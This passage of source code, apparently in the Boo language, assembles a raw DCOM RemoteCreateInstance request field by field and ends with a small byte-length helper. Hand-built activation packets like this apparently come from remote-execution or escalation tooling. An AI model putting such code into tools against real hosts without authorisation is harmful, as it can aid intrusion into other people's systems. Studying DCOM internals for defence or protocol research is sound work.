    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameReferentID', (of byte: 4, 0, 2, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNULLPtr', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoReserved2', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameMaxCount', packet_target_length)
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameOffset', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameActualCount', packet_target_length)
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameString', packet_target_unicode)
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoCommonHeader', (of byte: 1, 16, 8, 0, 204, 204, 204, 204))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoPrivateHeader', (of byte: 16, 0, 0, 0, 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoNULLPtr', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoProcessID', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoApartmentID', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoContextID', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoCommonHeader', (of byte: 1, 16, 8, 0, 204, 204, 204, 204))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoPrivateHeader', (of byte: 32, 0, 0, 0, 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoNULLPtr', (of byte: 0, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrReferentID', (of byte: 0, 0, 2, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestClientImpersonationLevel', (of byte: 2, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestNumProtocolSequences', (of byte: 1, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestUnknown', (of byte: 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrReferentID', (of byte: 4, 0, 2, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrMaxCount', (of byte: 1, 0, 0, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrProtocolSeq', (of byte: 7, 0))
    packet_DCOMRemoteCreateInstance.Add('DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoUnusedBuffer', (of byte: 0, 0, 0, 0, 0, 0))
    return packet_DCOMRemoteCreateInstance

  private static def DataLength2(length_start as int, string_extract_data as (byte)) as ushort:
    bytes as (byte) = (string_extract_data[length_start], string_extract_data[(length_start + 1)])
    string_length as ushort = BitConverter.ToUInt16(getByteRange(string_extract_data, length_start, (length_start + 1)), 0)
    return string_length
